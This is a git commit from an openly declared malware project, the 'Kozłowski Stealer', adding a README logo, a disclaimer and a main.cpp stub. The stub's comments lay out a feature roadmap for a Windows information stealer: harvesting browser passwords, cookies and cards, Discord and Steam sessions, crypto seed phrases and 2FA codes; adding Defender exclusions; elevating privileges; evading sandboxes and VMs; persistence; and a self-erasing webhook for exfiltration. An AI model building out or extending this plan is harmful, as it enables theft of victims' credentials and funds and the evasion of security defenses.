dba7868a55fc754af13154f5b8662d8cd32a9779
Mathew <u116_matand_waw@technischools.com>
2024-08-15 19:53:16 +0200

    A lot of changes made
    1. Added ideas and TODO list to main.cpp
    2. Added Logo and some small changes to README.md
    3. CMakeList.txt for compiling

--- README.md
+++ README.md
@@ -1,9 +1,14 @@
+<img src="Kozłowski.png" alt="logo" align="center">
+
 # Kozłowski Stealer
 Kozłowski is a advanced stealer writen in C++. Currently made only for Windows 11
 
 
+> [!CAUTION]
+> ***This is a malware***. It's against the law to use it on people without their consent. I'am not responsible for any damage did by this tool. Use it at your own risk.
+
 > [!WARNING]
-> ***This is a malware***. It's against the law to use it on people without their consent. I'am not responsible for any damage did by this tool.
+> This program uses ***Apache-2.0 License***. You can read it [here](LICENSE). By using this program you agree to the license.
 
 ## Usage
 
---
+++ main.cpp
@@ -0,0 +1,78 @@
+#include <iostream>
+#include <string>
+using namespace std;
+
+// TO ADD
+// 1. Checking browsers
+// 2. Checking for Discord, Slack
+// 3. Checking for Antiviruses
+// 4. Check for saved 2FA codes
+// 5. Add exclusion to win defender
+// 6. Auto Elevate (with saving reg)
+// 7. Steal sessions from (Steam eg.)
+// 8. VM Detection
+// 9. If launched in VM, implode and bluescreen
+
+/*
+=== Discord Information ===
+
+Nitro
+Badges
+Billing
+Email
+Phone
+HQ Friends
+HQ Guilds
+Gift Codes
+
+=== Browser Data ===
+
+Cookies
+Passwords
+Histories
+Autofills
+Bookmarks
+Credit/Debit Cards
+From Chrome, Edge, Brave, Opera GX, and many more...
+
+=== Application Data ===
+
+Steam
+Riot Games
+Telegram
+
+=== System Information ===
+
+User
+System
+Disk
+Network
+
+=== File Stealer ===
+
+Grabs Seed Phrases, Tokens, Private Keys, Recovery Codes, Backup Codes, 2FA codes
+
+=== General Functions ===
+
+Check if being run in a VirusTotal sandbox
+Adds file to startup
+
+
+ */
+/*
+
+MORE IDEAS:
+
+ - reverse version that unstoles data (maybe)
+ - one use only (After use it deletes the webhook and the file leaving no trace)
+ - useful mode (Not steals but gives important info like passwords, 2fa codes, etc)
+
+ */
+
+string status = "Beta";
+double version = 0.1;
+
+int main() {
+    cout << "hi!" << endl;
+    return 0;
+}
